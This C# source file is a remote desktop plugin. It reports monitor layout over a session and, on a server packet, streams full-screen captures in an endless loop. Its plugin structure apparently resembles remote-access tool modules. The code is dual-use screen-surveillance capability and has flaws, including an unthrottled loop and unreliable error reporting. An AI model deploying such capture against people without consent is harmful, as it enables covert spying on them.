using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Common.Comunication;
using Common.DTOs.MessagePack;
using static System.Net.Mime.MediaTypeNames;

namespace RemoteDesktopPlugin
{
    public class Plugin
    {
        public Session _session { get; set; }
        private string[] screen;

        public Plugin(Session session)
        {
            _session = session;
            _session.OnRemoteDesktop += HandlePacket;
            StartRemoteDesktop();
        }

        private void StartRemoteDesktop()
        {
            bool result = EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, EnumMonitorsCallback, IntPtr.Zero);
            if (!result)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"EnumDisplayMonitors failed with error code {error}");
            }
        }

        private void HandlePacket(object? sender, EventArgs e)
        {
            screen = ((RemoteDesktopDTO)sender).Screen;

            recorderTask = Task.Run(() =>
            {
                while (true)
                {
                    _session.SendPacketAsync(new RemoteDesktopDTO()
                    {
                        Frame = CaptureScreen()
                    });
                }
            });
        }

        Task recorderTask = Task.CompletedTask;

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        const int SRCCOPY = 0x00CC0020;

        public byte[] CaptureScreen()
        {
            IntPtr hWnd = GetDesktopWindow();
            IntPtr hDC = GetDC(hWnd);
            IntPtr hMemDC = CreateCompatibleDC(hDC);

            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);

            IntPtr hBitmap = CreateCompatibleBitmap(hDC, width, height);
            IntPtr hOld = SelectObject(hMemDC, hBitmap);

            BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, SRCCOPY);

            byte[] bitmapBytes = GetBitmapBytes(hBitmap, width, height);

            SelectObject(hMemDC, hOld);
            DeleteObject(hBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(hWnd, hDC);

            return bitmapBytes;
        }

        private byte[] GetBitmapBytes(IntPtr hBitmap, int width, int height)
        {
            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;  // top-down bitmap
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = BI_RGB;

            IntPtr hdc = GetDC(IntPtr.Zero);
            byte[] bitmapData = new byte[width * height * 3];

            if (!GetDIBits(hdc, hBitmap, 0, (uint)height, bitmapData, ref bmi, DIB_RGB_COLORS))
            {
                ReleaseDC(IntPtr.Zero, hdc);
                throw new Exception("Failed to retrieve bitmap data.");
            }

            ReleaseDC(IntPtr.Zero, hdc);

            int headerSize = 14 + Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            byte[] bmpBytes = new byte[headerSize + bitmapData.Length];

            // BITMAPFILEHEADER
            bmpBytes[0] = 0x42; // 'B'
            bmpBytes[1] = 0x4D; // 'M'
            int fileSize = headerSize + bitmapData.Length;
            BitConverter.GetBytes(fileSize).CopyTo(bmpBytes, 2);
            BitConverter.GetBytes((int)0).CopyTo(bmpBytes, 6); // Reserved
            BitConverter.GetBytes(headerSize).CopyTo(bmpBytes, 10); // Offset to pixel data

            // BITMAPINFOHEADER
            BitConverter.GetBytes(bmi.bmiHeader.biSize).CopyTo(bmpBytes, 14);
            BitConverter.GetBytes(bmi.bmiHeader.biWidth).CopyTo(bmpBytes, 18);
            BitConverter.GetBytes(bmi.bmiHeader.biHeight).CopyTo(bmpBytes, 22);
            BitConverter.GetBytes((short)bmi.bmiHeader.biPlanes).CopyTo(bmpBytes, 26);
            BitConverter.GetBytes((short)bmi.bmiHeader.biBitCount).CopyTo(bmpBytes, 28);
            BitConverter.GetBytes(bmi.bmiHeader.biCompression).CopyTo(bmpBytes, 30);
            BitConverter.GetBytes(bmi.bmiHeader.biSizeImage).CopyTo(bmpBytes, 34);
            BitConverter.GetBytes(bmi.bmiHeader.biXPelsPerMeter).CopyTo(bmpBytes, 38);
            BitConverter.GetBytes(bmi.bmiHeader.biYPelsPerMeter).CopyTo(bmpBytes, 42);
            BitConverter.GetBytes(bmi.bmiHeader.biClrUsed).CopyTo(bmpBytes, 46);
            BitConverter.GetBytes(bmi.bmiHeader.biClrImportant).CopyTo(bmpBytes, 50);

            // Bitmap data
            bitmapData.CopyTo(bmpBytes, headerSize);

            return bmpBytes;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public int[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
        }

        const int BI_RGB = 0;
        const int DIB_RGB_COLORS = 0;

        [DllImport("gdi32.dll")]
        public static extern bool GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint uUsage);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;


        // Structure for monitor information
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct MONITORINFOEX
        {
            public int cbSize;
            public RECT rcMonitor;
            public RECT rcWork;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string szDevice;
        }

        // Structure for rectangle
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        // Import necessary Win32 functions
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, EnumMonitorsDelegate lpfnEnum, IntPtr dwData);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFOEX lpmi);

        // Delegate for monitor enumeration callback
        public delegate bool EnumMonitorsDelegate(IntPtr hMonitor, IntPtr hdcMonitor, IntPtr lprcMonitor, IntPtr dwData);


        // Method to enumerate monitors
        public void EnumerateMonitors()
        {
            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, EnumMonitorsCallback, IntPtr.Zero);
        }

        // Callback function for monitor enumeration
        private bool EnumMonitorsCallback(IntPtr hMonitor, IntPtr hdcMonitor, IntPtr lprcMonitor, IntPtr dwData)
        {
            MONITORINFOEX monitorInfo = new MONITORINFOEX();
            monitorInfo.cbSize = Marshal.SizeOf(typeof(MONITORINFOEX)); // Set the size of the MONITORINFOEX structure

            if (!GetMonitorInfo(hMonitor, ref monitorInfo))
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"GetMonitorInfo failed with error code {error}");
                return true; // continue enumeration
            }

            _session.SendPacketAsync(new RemoteDesktopDTO()
            {
                Screen = new string[] { monitorInfo.szDevice, monitorInfo.rcMonitor.Left.ToString(), monitorInfo.rcMonitor.Right.ToString(), monitorInfo.rcMonitor.Top.ToString(), monitorInfo.rcMonitor.Bottom.ToString() }
            }).GetAwaiter().GetResult();

            return true;
        }

    }
}
